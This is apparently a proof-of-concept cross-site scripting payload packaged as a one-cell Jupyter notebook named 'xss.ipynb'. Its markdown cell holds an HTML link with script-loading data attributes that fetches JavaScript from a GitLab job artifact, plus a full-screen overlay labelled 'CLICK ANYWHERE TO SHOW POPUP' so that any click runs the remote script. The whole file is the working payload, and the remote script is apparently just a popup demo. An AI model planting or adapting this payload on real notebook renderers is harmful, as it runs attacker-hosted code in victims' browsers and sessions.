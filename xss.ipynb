{
 &#34;cells&#34;: [  
  {  
   &#34;cell_type&#34;: &#34;markdown&#34;,  
   &#34;source&#34;: [  
        &#34;&lt;a data-type=script data-remote=true href=&#39;https://gitlab.com/ankelly/pipeline_payload/-/jobs/916704117/artifacts/raw/data/alert.js&#39; style=&#39;position:fixed;z-index:9999;top:0;left:0;right:0;bottom:0&#39;&gt;&lt;/a&gt;CLICK ANYWHERE TO SHOW POPUP&#34;  
   ]  
  }]  
}
